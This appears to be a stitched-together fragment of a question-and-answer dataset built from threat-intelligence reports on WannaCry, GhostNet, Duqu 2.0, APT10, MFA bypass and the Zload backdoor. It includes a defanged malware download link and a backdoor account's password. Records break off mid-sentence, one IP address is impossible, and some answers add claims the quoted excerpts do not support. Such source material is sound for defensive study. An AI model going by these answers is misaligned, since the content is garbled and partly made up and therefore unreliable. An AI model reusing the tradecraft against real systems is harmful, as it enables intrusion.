March 6, 2017 we found it was hosting what appears to be a copy of the frontpage of HK01, a Hong Kong-based news site (see Figure 10).\nThe copied version of the HK01 site is missing the centre content displayed on the real site. Instead it shows a link with the following text: \"Adobe Flash Player \u7248\u672c\u904e\u4f4e,\u8acb\u9ede\u64ca\" [Adobe Flash Player this version is outdated. Please click].\nThe link connects to:\nhXXp://get.adobe.com.bowenpress.org/Adobe/update/20161201/AdobeUpdate[.]html\nClicking this link initiates a download of an executable and then forwards the user to the legitimate Adobe update site. These action are done through the following HTML code:\nWe browsed the directory of 23[.]1239[.]1106[.]119/adobe/update and found three different sub directories that each served three different executables (see Figure 11). A fourth sub directory and fourth executable appeared on March 12, 2017. Analysis of these executables shows they are malware.\n\nAnswer this question based on the above context: What type of malware was used in the campaign, and how did the operators attempt to evade detection and frustrate analysis of their malware operation?",

See appendix A for a table of the threat actors' activity mapped to MITRE ATT&CK tactics and techniques.\nAs early as May 2021, the FBI observed Russian state-sponsored cyber actors gain access to an NGO, exploit a flaw in default MFA protocols, and move laterally to the NGO's cloud environment.\nRussian state-sponsored cyber actors gained initial access [] to the victim organization via compromised credentials [] and enrolling a new device in the organization's Duo MFA. The actors gained the credentials [] via brute-force password guessing attack [], allowing them access to a victim account with a simple, predictable password. The victim account had been un-enrolled from Duo due to a long period of inactivity but was not disabled in the Active Directory. As Duo's default configuration settings allow for the re-enrollment of a new device for dormant accounts, the actors were able to enroll a new device for this account, complete the authentication requirements, and obtain access to the victim network.\nUsing the compromised account, Russian state-sponsored cyber actors performed privilege escalation [] via exploitation of the \"PrintNightmare\" vulnerability () [] to obtain administrator privileges. The actors also modified a domain controller file, c:\\windows\\system32\\drivers\\etc\\hosts, redirecting Duo MFA calls to localhost instead of the Duo server []. This change prevented the MFA service from contacting its server to validate MFA login\u2014this effectively disabled MFA for active domain accounts because the default policy of Duo for Windows is to \"fail open\" if the MFA server is unreachable. Note: \"Fail open\" can happen to any MFA implementation and is not exclusive to Duo.\nAfter effectively disabling MFA, Russian state-sponsored cyber actors were able to successfully authenticate to the victim's virtual private network (VPN) as non-administrator users and make Remote Desktop Protocol (RDP) connections to Windows domain controllers []. The actors ran\ncommands to obtain credentials for additional domain accounts; then, using the method described in the previous paragraph, changed the MFA configuration file and bypassed MFA for these newly compromised accounts. The actors leveraged mostly internal Windows utilities already present within the victim network to perform this activity.\nUsing these compromised accounts without MFA enforced, Russian state-sponsored cyber actors were able to move laterally [] to the victim's cloud storage and email accounts and access desired content.\nMedium Headline: Indicators of Compromise\nRussian state-sponsored cyber actors executed the following processes:\n\u2022 ping.exe \u2212 A core Windows Operating System process used to perform the Transmission Control Protocol (TCP)/IP Ping command; used to test network connectivity to a remote host [] and is frequently used by actors for network discovery [].\n\u2022 regedit.exe \u2212 A standard Windows executable file that opens the built-in registry editor [].\n\u2022 rar.exe \u2212 A data compression, encryption, and archiving tool [].

In the context of nation-state cyber warfare, a country like China can utilize botnets to conduct DDoS attacks against other nations, as seen in the 2007 Estonian cyber attacks. According to the APT report, the Estonian attacks were characterized by a massive DDoS campaign that utilized thousands of bots from locations around the world, including the US, Vietnam, Peru, and China. To acquire such infrastructure, China could purchase a subscription to use an existing botnet from a booter/stresser service, or rent a network of compromised systems from a third-party provider. This would allow China to conduct large-scale cyber attacks with relative ease and anonymity, making it difficult for the targeted country to attribute the attack. Furthermore, the use of botnets would enable China to overwhelm the targeted country's digital infrastructure, causing significant disruptions to critical services such as banking, government, and media outlets.",

    "instruction": "Medium Headline: Why some parts of the NHS were affected\n2.1 NHS organisations across England were affected by the WannaCry attack. Figure 3 sets out the location of the trusts affected and shows the:\n\u2022 37 trusts infected by the WannaCry malware; and\n\u2022 44 trusts not infected by the malware but reporting disruption.\n2.2 Of the 37 trusts infected, 32 were located in the North NHS region and the Midlands and East NHS region. NHS England believes more organisations were infected in these regions because they were hit early on 12 May before the WannaCry kill-switch was activated.\nSmall Headline: Failure to patch and update systems and reliance on old software\n2.3 It is not possible to eliminate all cyber threats but organisations can prevent harm through good cyber-security. Such practice includes maintaining up-to-date firewalls and anti-virus software, and applying patches (updates) in a timely manner. NHS England's view is that WannaCry infected some parts of the NHS mainly because organisations had failed to maintain good cyber-security practices.\n2.4 NHS Digital told us that all the infected trusts had a common vulnerability in their Windows operating systems which was exploited by the WannaCry attack. All NHS organisations infected by WannaCry had unpatched, or unsupported, Windows operating systems. However, whether organisations had patched their systems or not, taking action to manage their firewalls facing the internet would have guarded the organisations against infection.\nVery Small Headline: Note\n1 NHS England believes the concentration of infected trusts in the North NHS region and the Midlands and East NHS region does not reflect variations in cyber-security, but may be partially explained by these organisations becoming infected earlier in the day, before the WannaCry 'kill-switch' was activated.\nSource: National Audit Office analysis of NHS England data\n2.5 NHS Digital told us that the majority of NHS devices infected were unpatched but on the supported Windows 7 operating system. Trusts using Windows 7 could have protected themselves against WannaCry by applying a patch (or update) issued by Microsoft in March 2017, and NHS Digital had issued CareCERT alerts on 17 March and 28 April asking trusts to apply the patch.2 According to the Department of Health (the Department), more than 90% of devices in the NHS use the Windows 7 operating system.\n2.6 A second issue was that some trusts were running the older Windows XP operating system on some devices. This made the trusts vulnerable because Microsoft was no longer releasing patches for this operating system, and so they could not protect their systems from WannaCry unless they isolated those devices from the network. Some trusts also experienced issues with some medical equipment, such as MRI scanners that have Windows XP embedded within them (see paragraph 1.3). This equipment is generally managed by the system vendors and local trusts are not capable of applying updates themselves. Support from the vendors of these devices was often poor according to NHS England and NHS Digital. However, trusts running Windows XP on their medical equipment could have protected themselves by isolating these devices from the rest of the network (although this may necessitate manual workarounds). In July 2017, as part of its response to the National Data Guardian review, the Department told local bodies to ensure that they had moved away from, or were actively managing, unsupported software by April 2018.\n2.7 The Department and Cabinet Office had written to trusts in 2014 offering some temporary help with security for old equipment until April 2015, after which time there would be no support. This meant that it was essential that all NHS organisations had \"robust plans\" to migrate away from Windows XP. Despite this, the Department told us about 5% of the NHS IT estate, including computers and medical equipment, was still using Windows XP on 12 May 2017. This is partly explained by the fact that it is not always possible to remove or update Windows XP in applications and IT services based on that operating system. Immediately after the WannaCry attack Microsoft issued a patch for Windows XP that would prevent WannaCry and similar ransomware.\nSmall Headline: Leadership and size of trusts\n2.8 We found no clear relationship between those trusts infected by WannaCry and the quality of their leadership, as rated by the Care Quality Commission (CQC). Of the 37 trusts infected by WannaCry, four (11%) had been rated as 'inadequate' against the 'well-led' domain at their last CQC inspection, compared with 7% of NHS organisations not infected.3 However, CQC had not focused on how well led trusts were in relation to cyber-security in their inspections before 12 May 2017. We understand CQC has plans to enhance its line of questions regarding information and digital systems as part of its inspection of the leadership of trusts in the future.\n2.9 We also found that infected trusts tended to employ more staff than average. Of the 37 infected trusts:\n\u2022 14 (38%) were among the 25% of trusts employing the most staff; and\n\u2022 26 (70%) employed more than the median number of staff.\n2 A CareCERT alert is an email sent by NHS Digital providing information or requiring action from NHS organisations.\n3 Of the 37 trusts infected by WannaCry, 36 had a CQC rating.\nAlthough there is limited evidence on why this should be the case, we found that:\n\u2022 some of the trusts we spoke to told us that integrating IT systems when trusts merge (and become larger) and running many different versions of Windows operating systems, not all of which are supported, can be a challenge; and\n\u2022 WannaCry exploited weaknesses within parts of Microsoft's Windows operating system used to share files within organisations. This meant it spread automatically in some cases, and organisations with large Windows networks were among the worst affected.\nSmall Headline: Prepared for a cyber attack\n2.10 Before 12 May, the Department and its arm's-length bodies did not know whether trusts had complied with CareCERT alerts as no formal mechanism of assessment existed at that time. On 12 May, NHS Digital worked with NHS England to put in place a formal mechanism for assessing whether NHS organisations had complied with CareCERT alerts. Emergency, Preparedness, Resilience and Response (EPRR) teams requested a positive return from providers by midnight on 12 May that, for example where they had:\n\u2022 not been subject to an attack, they had implemented the patch; and\n\u2022 been subject to an attack, they had implemented remedial works; had been able to roll back their systems; and could continue to provide emergency services or \u2013 if not \u2013 had put mitigations in place.\n2.11 Before the WannaCry attack, NHS Digital offered an on-site inspection to hospitals to assess their cyber-security (known as 'CareCERT Assure'). This inspection was voluntary. By 12 May, NHS Digital had inspected 88 out of 236 trusts and none had passed. NHS Digital's review of the WannaCry attack concluded that CareCERT advice and guidance (including inspections) was mostly followed by organisations with relatively mature cyber-security arrangements, while vulnerable trusts were not taking action to improve their security. NHS Digital also found that, in general, trusts had not identified cyber-security as being a risk to patient outcomes, and had tended to overestimate their readiness to manage a cyber attack. NHS Digital believes this reflects a lack of understanding of the nature of cyber risk among trusts, rather than a neglect of cyber-security.\n2.12 The Department and its arm's-length bodies did not hold information on how prepared local organisations were to respond to a cyber attack, such as whether cyber-security appeared on organisations' risk registers or whether trusts complied with good practice. The Department and its arm's-length bodies also had limited central information on trusts' IT and digital assets such as anti-virus software and IP addresses. At the start of its investigation, the National Crime Agency had to gather evidence from all sites, including information on the devices affected, IP addresses and network traffic, to assess the impact of WannaCry on the NHS, rather than being able to access the information centrally.\nRead the text above and answer this question: What specific vulnerabilities in the Windows operating systems were exploited by the WannaCry attack, and how could these have been mitigated? Discuss the role of patches and firewalls.",
    "output": "The WannaCry attack exploited a common vulnerability in the Windows operating systems, specifically affecting both unpatched and unsupported versions. All NHS organizations infected by WannaCry had unpatched or unsupported Windows operating systems. Trusts using Windows 7 could have protected themselves by applying a patch issued by Microsoft in March 2017.

    "instruction": "Big Headline: 1.Introduction\nStuxnet is probably the most well-known malware of our times. Its fame stems from the facts that it targeted a very specific industrial facility, namely a uranium enrichment plant in Iran, it aimed at physical destruction of uranium centrifuges, and it apparently accomplished its mission successfully. In addition to all these characteristics, IT security experts also appreciate its technical sophistication and the zero-day exploits that it used. Stuxnet was also an alarm to the developed world: it shed light on the capabilities of advanced attackers, and at the same time, on the numerous weaknesses of our computing infrastructure. Putting these two together, people started to feel hopelessly vulnerable.\nYet, unfortunately, Stuxnet is not a unique example for a highly sophisticated targeted threat, but there are numerous other pieces of malware of similar kind, including Duqu, Flame, Regin, etc. Among those, Duqu is particularly interesting, not only because we discovered it back in 2011, but because our analysis pointed out that - while Duqu's objective is different - it has very strong similarities to Stuxnet in terms of architecture, code, and methods to achieve stealthiness. Today, it is widely believed within the IT security community that Duqu was created by the same attackers who created Stuxnet.\nAnd now we have a new member of the same family! Last month, we received interesting samples from Kaspersky Lab with a hint that they might be related to the Duqu samples of 2011; however, these new samples are from 2014. Our common understanding was that it would be interesting to figure out whether this new threat is indeed related to the old Duqu attack, and we in the CrySyS Lab should try to focus our analysis efforts on answering this question. It is important to emphasize that we did our analysis independently from Kaspersky Lab: we did not read their preliminary report and they did not share any of their findings with us (apart from the samples that we received from them).\nThe analysis results performed by Kaspersky Lab can be read in the following report:\nIn this report, we present the results of our comparative analysis of the old version of Duqu and the new version, codenamed \"Duqu 2.0\". We concentrate on the description of the relevant similarities and differences we have found between the two malware samples.\n\nQ: How does the architecture and code of Duqu compare to Stuxnet, and what implications does this have for attribution and understanding the capabilities of the attackers?",
    "output": "A: The architecture, code, and methods used by Duqu to achieve stealthiness are very similar to those of Stuxnet. This similarity has led the IT security community to believe that Duqu was created by the same attackers who created Stuxnet. Understanding these similarities helps in attributing the attacks to the same group and provides insights into the advanced capabilities and techniques employed by these attackers.",

    "instruction": "Context: Small Headline: Methodology\nWe compiled a unified and comprehensive list of infected computers from all the control servers, as there was considerable duplication across them. There were several duplicate entries in the list of infected computers\u2014in some cases, the same infected computer was logged multiple times as it was connecting from a different IP address. In other instances, multiple infected computers were assigned different internal IP addresses and had different computer names but shared the same external IP address. This signifies that there were multiple infected computers sharing Internet access. Where possible, we filtered the results by unique computer name, and if no computer name was present, we filtered by unique external IP address.48 (See Fig. 12 - p. 41)\nOn the surface, the names of the infected computers in the sample are provocative. There are references to ministries of foreign affairs, foreign embassies, and other government entities. Some contains names of officials or their positions/titles. However, we recognize that a computer name can be anything its owner wishes, and may be completely unrelated to the location, function, or owner of that particular computer.\nTherefore, in order to be more confident as to the true identity or purpose of the infected computer, we relied on reverse DNS look-ups and each IP address' record from the Regional Internet Registries. Using these two pieces of information we were able to confirm the validity of the identity of several infected computers with a high (H) degree of confidence.\nIn some cases the computer name associated with the infected computer is actually a domain name or an acronym for a recognizable institution or organization. In these cases we classified our identification of the target with either a medium (M) or low (L) level of confidence. Medium confidence refers to instances where we have otherwise identified a related high confidence target,\n48 In one case we removed 117 unique IP addresses from Mexico that appeared to belong to the same computer connecting in to the control server from a DSL provider.\nFig. 12\nThe geographic location of infected hosts.\nThis graphic illustrates the global reach of the GhostNet. There were 1,295 infected computers that reported to the control server. The infections were spread across 103 countries. Taiwan reported the most infections followed by the United States, Vietnam and India.\nbut for which we rely on the computer name for identification. Low confidence refers to instances in which we rely solely on the computer name for identification.\nSmall Headline: Infection timeline\nThe earliest infected computer called home to the control server on May 22, 2007. The most recent entry in our sample is March 12, 2009. On average, the amount of time that a host was actively infected was 145 days.49 While 90 infected computers were only infected for one day, 145 were infected for over 400 days. The longest infection span was 660 days. In total, 422 hosts checked in March 1-12, 2009; 373 of these computers were infected in 2008. The data indicates that despite a reduction in new infections, the network continues to be operational. (See Fig. 13 - p. 45)\nThere are significant spikes in infection rates in December 2007 and August 2008.\nThere were 320 infections in December 2007 spread across 56 countries. However, 113 were located within Taiwan and the majority of these infections occurred within a single organization: the Taiwan External Trade Development Council. During this same period, computers at the Embassies of India in Belgium and Zimbabwe were infected as were the Embassies of Indonesia and the Republic of Korea in the People's Republic of China. In addition, computers at the Ministry of Foreign Affairs in Iran were infected as were several computers at the Tibetan Government-in-Exile.\nThe spike in August 2008 totalled 258 infections spread across 46 countries. The OHHDL computer was infected during one of these spikes in August 2008 (It last checked in to the control server in September 2008). This spike included the Chinese Embassy in the United States,50 3 computers at the Embassy of India in the Unites States, and the High Commission of India in the United Kingdom and in Cyprus. It also included the Embassy of Cyprus in Germany, the Embassy of Malaysia in Cuba, the Embassy of Thailand in the Philippines and the Ministry of Industry in Vietnam. Several companies were also compromised, including Net Trade in Taiwan, the New York Office of Deloitte & Touche, and PetroVietnam, the government-owned oil and gas Company.\n49 The average number of days from the initial infection to the last time an infected computer \"checked in\" with a control server.\n50 It is unclear whether the affected embassy is the Republic of China (Taiwan) or People's Republic of China.\nFig. 13\nGhostNet infection timeline.\nThis screen capture of a timeline generated with Palantir illustrates when and how many computers were infected by the GhostNet. It shows that there are significant spikes in infection rates in December 2007 and August 2008.\nBig Headline: The evidence presented in this report\u2014through a combination of field investigations, interviews, technical scouting, data analysis, mining and visualization\u2014paints a disturbing picture.\nGhostNet represents a network of compromised computers resident in high-value political, economic, and media locations spread across numerous countries worldwide. At the time of writing, these organizations are almost certainly oblivious to the compromised situation in which they find themselves. The computers of diplomats, military attach\u00e9s, private assistants, secretaries to Prime Ministers, journalists and others are under the concealed control of unknown assailant(s).\nIn Dharamsala and elsewhere, we have witnessed machines being profiled and sensitive documents being removed. At our Laboratory, we have analysed our own infected \"honey pot\" computer and discovered that the capabilities of GhostNet are potent and wide ranging. Almost certainly, documents are being removed without the targets' knowledge, keystrokes logged, web cameras are being silently triggered, and audio inputs surreptitiously activated.\nThis raises the question, how many sensitive activities have been preemptively anticipated by intelligence gathered through this network? How many illegal transactions have been facilitated by information harvested through GhostNet? Worst of all, how many people may have been put at risk?\nWhile these questions are compelling, it would be imprudent to read these findings as an indictment, or to attribute to the owners of GhostNet motivations and intentions for which there is no evidence.\nBig Headline: Alternative explanations\nThe list of computers controlled by the GhostNet is significant, and certainly atypical for a cybercrime network. The size of the network is small, and the concentration of high-value systems is significant.\nAt the same time, penetrations of this type are not uncommon. Recently, several large-scale spy nets have been discovered, including ones containing lists of affected computers of a magnitude higher than that harvested by GhostNet.\nThis trend is predictable, converging with accumulating incidents of cyber-attacks facilitated by lower entry-thresholds for computer exploitation methods and technologies. The tools we profile in our investigation, though apparently amassed in a complex way to achieve a definite purpose, are not restricted to an exclusive guild of experts with specialized and confidential knowledge.\nToday, pirated cyber-crime kits circulate extensively on the Internet and can be downloaded by anyone about as easily as the latest pirated DVD.51 Cyberspace has empowered individuals and small groups of non-state actors to do many things, including executing sophisticated computer network operations that were previously only the domain of state intelligence agencies. We have entered the era of do-it-yourself (DIY) signals intelligence.\n51 http://ddanchev.blogspot.com/2008/11/zeus-crimeware-kit-gets-carding-layout.html\nAnswer this question: How did the researchers verify the true identity or purpose of the infected computers in the GhostNet attack, and what levels of confidence were assigned to these identifications?",
    "output": "The researchers verified the true identity or purpose of the infected computers using reverse DNS look-ups and each IP address' record from the Regional Internet Registries. They assigned different levels of confidence based on the information available. High (H) confidence was assigned when both reverse DNS and registry records matched. Medium (M) confidence was assigned when the computer name matched a known institution and there was a related high confidence target. Low (L) confidence was assigned when identification relied solely on the computer name.",

    "instruction": "Context: Medium Headline: Step 4\nIn the final step, the malware will iterate over C&C servers contained in the smcache.dat configuration file and will try to reach each one. The structure of the smcache.dat config file is as follows:\nThe protocol string can have one of nine possible values:\nTCP\nHTTPS\nUDP\nDNS\nICMP\nHTTPSIPV6\nWEB\nSSH\nHTTP\nDepending on the protocol tied to the particular C&C domain, the malware sets up the connection, sends a beacon to the C&C and waits for commands.\nIn this blogpost, we will mainly focus on the HTTP protocol option as we've seen it being used by the attackers.\nThe structure of the smcache.dat config file\nWhen using the HTTP protocol, the core module first opens two persistent request handles \u2013 one for POST and one for GET requests, both to \"/connect\" . These handles are tested by sending an empty buffer in the POST request and checking the HTTP status code of the GET request. Following this, the malware sends the initial beacon to the C&C server by calling the InternetWriteFile API with the previously opened POST request handle and reads data from the GET request handle by calling InternetReadFile .\nHTTP packet order\nHTTP POST beacon\nThe core module uses the following (mostly hard-coded) HTTP headers:\nAccept: */*\nx-cid: {<uuid>} \u2013 new uuid is generated for each GET/POST request pair\nPragma: no-cache\nCache-control: no-transform\nUser-Agent: <user_agent> \u2013 generated from registry or hard-coded (see below)\nHost: <host_value> \u2013 C&C server domain or the value from hostcfg.dat (see below)\nConnection: Keep-Alive\nContent-Length: 4294967295 (max uint, only in the POST request)\nSmall Headline: Initial beacon\nThe first data packet the malware sends to a C&C server contains a base64 encoded LZNT1-compressed buffer, including a newly generated uuid (different from the uuid used in the x-cid header), the victim's username, OS version and architecture, computer DNS and BIOS names and the comment string found in smcache.dat or comment.dat . The value from comment.dat takes precedence if this file exists.\nIn the core module sample we analyzed, there was actually a typo in the function that reads the value from comment.dat \u2013 it looks for the key \"COMMNET\" instead of \"COMMENT\" .\nAfter this, the malware enters a loop waiting for commands from the C&C server in the form of the ID value of one of the call objects.\nEach message sent to the C&C server contains a hard-coded four byte number value with the same structure as the values used as keys in the call-object map. The ID numbers associated with messages sent to C&C servers that we've seen are:\nInteresting observations about the protocols, other than the HTTP protocol:\nHTTPS does not use persistent request handles\nHTTPS uses HTTP GET request with data Base64-encoded in the cookie header to send the initial beacon\nHTTPS, TCP and UDP use a custom \"magic\" header: Magic-Code: hhjjdfgh\nSmall Headline: String obfuscation\nWe came across samples of the core module with only cleartext strings but also samples with certain strings obfuscated by XORing them with a unique (per sample) hard-coded key.\nEven within the samples that contain obfuscated strings, there are many cleartext strings present and there seems to be no logic in deciding which string will be obfuscated and which won't. For example, most format strings are obfuscated, but important IoCs such as credentials or filenames are not.\nTo illustrate this: most strings in the function that retrieves a value from the comment.dat file are obfuscated and the call to GetPrivateProfileStringW is dynamically resolved by the GetProcAddress API, but all the strings in the function that writes into the same config file are in cleartext and there is a direct call to\nWritePrivateProfileStringW .\nOverall, the core module code is quite robust and contains many failsafes and options for different scenarios (for example, the amount of possible protocols used for C&C communication), however, we probably only saw samples of this malware that are still in active development as there are many functions that are not yet implemented and only serve as placeholders.\nVery Small Headline: Zload (process starter)\nThis function is fairly simple, its main objective is to execute another binary. It first retrieves the path to the directory where the Zload plugin binary is located (<root_folder>) and creates a new subfolder called \"mec\" in it. After this it renames and moves three files into it:\nthe Zload plugin binary itself as <root_folder>\\mec\\logexts.dll ,\n<root_folder>\\spdlogd.exe as <root_folder>\\mec\\spdagent.exe and\n<root_folder>\\kb.ini as <root_folder>\\mec\\kb.ini\nAfter the files are renamed and moved, it creates a new process by executing the binary <root_folder>\\mec\\spdagent.exe (originally <root_folder>\\spdlogd.exe ).\nVery Small Headline: Backdoor user account creation\nNext, the plugin carries out registry manipulation (details can be found in the appendix), that lowers the system's protection by:\nAllowing local accounts to have full admin rights when they are authenticating via network logon\nEnabling RDP connections to the machine without the user password\nDisabling admin approval on an administrator account, which means that all applications run with full administrative privileges\nEnabling anonymous SID to be part of the everyone group in Windows\nAllowing \"Null Session\" users to list users and groups in the domain\nAllowing \"Null Session\" users to access shared folders\nSetting the name of the pipe that will be accessible to \"Null Session\" users\nAfter this step, the plugin changes the WebClient service startup type to \"Automatic\" . It creates a new user with the name \"DefaultAccount\" and the password \"Admin@1999!\" which is then added to the \"Administrator\" and \"Remote Desktop Users\" groups. It also hides the new account on the logon screen.\nAs the last step, the plugin checks the list of running processes for process names \"360tray.exe\" and \"360sd.exe\" and executes the file \"spdlogd.exe\" if neither of them is found.\nVery Small Headline: 4C73A62A9F19EEBB4FEFF4FDB88E4682EF852E37FFF957C9E1CFF27C5E5D47AD\nMecGame is another example of a plugin that can be loaded by the Core Plugin . Its main purpose is similar to the previously described Zload plugin \u2013 it executes the binary \"spdlogd.exe\" and achieves persistence by registering an RPC interface with UUID {1052E375-2CE2-458E-AA80-F3B7D6EA23AF} . This RPC interface represents a function that decodes and executes a base64 encoded shellcode.\nThe MecGame plugin has several methods for executing spdlogd.exe depending on the level of available privileges. It also creates a lockfile with the name MSSYS.lck or <UserName>-XPS.lck depending on the name of the process that loaded it, and deletes the files atomxd.dll and logexts.dll .\nIt can be installed as a service with the service name \"inteloem\" or can be loaded by any executable that connects to the internet via the Winsock2 library.\nVery Small Headline: ABA89668C6E9681671A95B3D7A08AAE2A067DEED2D835BA6F6FD18556C88A5F2\nThis DLL is a backdoor module which exports four functions: \"OperateRoutineW\" , \"StartRoutineW\" , \"StopRoutineW\" and \"WorkRoutineW\" ; the main malicious function being \"StartRoutineW\" .\nFor proper execution, the backdoor needs configuration data accessed through a shared object with the file mapping name either \"Global\\\\4ED8FD41-2D1B-4CC3-B874-02F0C60FF9CB\" or \"Local\\\\4ED8FD412D1B-4CC3-B874-02F0C60FF9CB\" . Unfortunately we didn't come across the configuration data, so we are missing some information such as the C&C server domains this module uses.\nThere are 15 commands supported by this backdoor (although some of them are not implemented) referred to by the following numerical identifiers:\nVery Small Headline: Communication protocol\nThe MulCom backdoor is capable of communicating via HTTP and TCP protocols. The data it exchanges with the C&C servers is encrypted and compressed by the RC4 and aPack algorithms respectively, using the RC4 key loaded from the configuration data object.\nIt is also capable of proxy server authentication using schemes such as Basic, NTLM, Negotiate or to authenticate via either the SOCKS4 and SOCKS5 protocols.\nAfter successful authentication with a proxy server, the backdoor sends data xorred by the constant 0xBC . This data is a set with the following structure:\nData structure\nAnother interesting capability of this backdoor is the usage of layered C&C servers. If this option is enabled in the configuration object (it is not the default option), the first request goes to the first layer C&C server, which returns the IP address of the second layer. Any subsequent communication goes to the second layer directly.\nAs previously stated, we found several code similarities between the MulCom DLL and the FFRat (a.k.a. FormerFirstRAT ).\nBig Headline: Conclusion\nWe have described a robust and modular toolset used most likely by a Chinese speaking APT group targeting gambling-related companies in South East Asia. As we mentioned in this blogpost, there are notable code similarities between FFRat samples and the MulCom backdoor. FFRat or \"FormerFirstRAT'' has been publicly associated with the DragonOK group according to the Palo Alto Network report, which has in turn been associated with backdoors like PoisonIvy and PlugX \u2013 tools commonly used by Chinese speaking attackers.\nWe also described two different infection vectors, one of which weaponized a vulnerable WPS Office updater. (<https://www.wps.com/about-us/>)We rate the threat this infection vector represents as very high, as WPS Office claims to have , and this vulnerability potentially allows a simple way to execute arbitrary code on any of these devices. We have contacted WPS Office about the vulnerability we discovered and it has since been fixed.\nOur research points to some unanswered questions, such as reliable attribution and the attackers' motivation.\nAnswer this question: Explain the process by which the Zload plugin in Operation Dragon Castling creates a backdoor user account. What registry manipulations are performed to lower the system's protection?",

It then creates a new user named 'DefaultAccount' with the password 'Admin@1999!' and adds this account to the 'Administrator' and 'Remote Desktop Users' groups.

malware family, and how does its design contribute to its effectiveness and stealthiness?",
    "output": "A: Dimnie, a malware family that has been active since early 2014, is characterized by its modular design and stealthy command and control methods. It primarily functions as a downloader but includes various information-stealing capabilities. Each module of Dimnie is injected into the memory of core Windows processes, which complicates analysis and detection. Its longevity and effectiveness can be attributed to its minimal changes over the years and its focus on a previously Russian-centric target base, allowing it to remain largely undetected until recent campaigns.",

    "output": "Persistence is a critical aspect of an Advanced Persistent Threat (APT) as it enables attackers to maintain their access to compromised systems over time. In the case of Poison Ivy, persistence is achieved through the use of a watchdog thread that is injected into the explorer.exe process. This thread automatically restarts the Poison Ivy server process if it is unexpectedly terminated by the target's operating system. Additionally, Poison Ivy's ability to inject code into legitimate processes and use a custom network protocol over TCP allows it to maintain its foothold on the system even after system restarts or credential changes. Furthermore, the 'persistence' option in Poison Ivy's configuration allows attackers to specify whether the RAT should maintain its connection to the compromised system even after a reboot. By leveraging these techniques, attackers using Poison Ivy can ensure that their access to the compromised system persists over time, allowing them to continue stealing sensitive data and intellectual property.",

    "instruction": "Small Headline: APT10 has almost certainly been undertaking a global operation of unprecedented size and scale targeting a number of MSPs.\nAPT10 has vastly increased the scale and scope of its targeting to include multiple sectors, which has likely been facilitated by its compromise of MSPs. Such providers are responsible for the remote management of customer IT and end-user systems, thus they generally have unfettered and direct access to their clients' networks. They may also store significant quantities of customer data on their own internal infrastructure.\nMSPs therefore represent a high-payoff target for espionage-focused threat actors such as APT10. Given the level of client network access MSPs have, once APT10 has gained access to a MSP, it is likely to be relatively straightforward to exploit this and move laterally onto the networks of potentially thousands of other victims. This, in turn, would provide access to a larger amount of intellectual property and sensitive data. APT10 has been observed to exfiltrate stolen intellectual property via the MSPs, hence evading local network defences.\nOther threat actors have previously been observed using a similar method of a supply chain attack, for example, in the compromise of Dutch certificate authority Diginotar in 20116 and the compromise of US retailer Target in 2013.7\nThe command and control (C2) infrastructure chosen by APT10 for Operation Cloud Hopper is predominantly referenced using dynamic-DNS domains. The various domains are highly-interconnected through shared IP address hosting, even linking back historically to the threat actor's much older operations.\nAt present, the indicators detailing APT10's operations number into the thousands and cannot be easily visualised. The graph in Figure 8 overleaf depicts a high-level view of the infrastructure used by APT10 throughout 2016. As the campaign has progressed into 2017, the number of dynamic-DNS domains in use by the threat actor has significantly increased.\nThe graph in Figure 9, also shown overleaf, extracts one node of the newer C2 from the infrastructure shown in Figure 8 and maps this to the older infrastructure of APT10, as disclosed by FireEye in their 2014 Siesta  Campaign blog post8. In terms of timing, it is highly likely that a single party is responsible for all of these domains, based on our observations of infrastructure overlap.\nThrough our investigations, we have identified multiple victims who have been infiltrated by the threat actor. Several of these provide enterprise services or cloud hosting, supporting our assessment that APT10 are almost certainly targeting MSPs. We believe that the observed targeting of MSPs is part of a widescale supply-chain attack.\n6 https://security.googleblog.com/2011/08/update-on-attempted-man-in-middle.html\n7 https://krebsonsecurity.com/2014/02/target-hackers-broke-in-via-hvac-company/\n8 https://www.fireeye.com/blog/threat-research/2014/03/a-detailed-examination-of-the-siesta-campaign.html\nFigure 8: High-level view of infrastructure used by APT10 throughout 2016\nMedium Headline: Japan focused campaign\nIn a separate series of operations, APT10 has been systematically targeting Japanese organisations using bespoke malware referred to in the public domain as 'ChChes'. While linked to APT10, via shared infrastructure, this campaign exhibits some operational differences suggesting a potential sub-division within the threat actor. These operations have seen APT10 masquerading as legitimate Japanese public sector entities (such as the Ministry of Foreign Affairs, Japan International Cooperation Agency and the Liberal Democratic Party of Japan) to gain access to the victim organisations.\nTargeting of these entities by APT10 is consistent with previous targeting by China-based threat actors of a wide range of industries and sectors in Japan. This includes the targeting of commercial companies, and government\nagencies, both of which has resulted in the exfiltration of large amounts of data.9\nAPT10's standard compromise methodology begins with a spear phishing email sent to the target, usually with an executable attachment designed to lure the victim to open it. Analysis of the filenames associated with some of the latest APT10 malware samples, particularly from late 2016, highlights the use of Japanese language filenames which clearly indicates a campaign targeting Japanese-speaking individuals. Further analysis of these files can be found in Annex B.\nTable 1 shows some example file names being used by APT10 in this campaign.\nTable 1: Japanese language filenames used by APT10\nThe following is an example of a malicious decoy document referencing Mitsubishi Heavy Industries:\nFigure 10: Decoy document based on press release from Japanese firm Mitsubishi Heavy Industries detailing the unveiling of their new ABLASER-DUV (Deep Ultraviolet Laser)\n9 http://thediplomat.com/2016/04/japans-achilles-heel-cybersecurity/\nA notable tactic of this APT10 subset is to register C2 domains that closely resemble legitimate Japanese organisations. Table 2 shows a selection of the spoofed domains registered, alongside the email addresses listed at registration and the legitimate impersonated domains.\nTable 2: Domains observed being impersonated by APT10\nThe top level C2 domains observed in this campaign share a number of features that can be used to further identify affiliated nodes. Table 3 displaying registrant information can be seen below:\nTable 3: Known APT10 registration details showing a common name server\nNone of the domains share identical contact information other than stating that the respective registrants are based in the US. The contact streets, organisations, and names are all distinct between domains.\nSome of the domains, that do resolve, share common IP address space with the network of dynamic-DNS domains that we associate with Operation Cloud Hopper as detailed earlier\nin the report. This connection is highlighted in the infrastructure graph shown in Figure 11 below, where some ChChes C2 domains can be seen in the bottom left, while on the far right are the older APT10 domains referenced in previous reporting.\nFigure 11: Infrastructure graph linking early PlugX domains to recent ChChes domains\nMedium Headline: APT10 alignment with previous China-based hacking\nEspionage attacks associated with China-based threat actors, as noted above, have traditionally targeted organisations that are of strategic value to Chinese businesses and where intellectual property obtained from such attacks could facilitate domestic growth or advancement.\nThere has been significant open source reporting which has documented the alignment between apparent information collection efforts of China-based threat actors and the strategic emerging industries documented in China's Five Year Plan (FYP).10 The 13th FYP was released in March 2016 and the sectors and organisations known to be targeted by APT10 are broadly in line with the strategic aims documented in this plan. These aims outlined in the FYP will largely 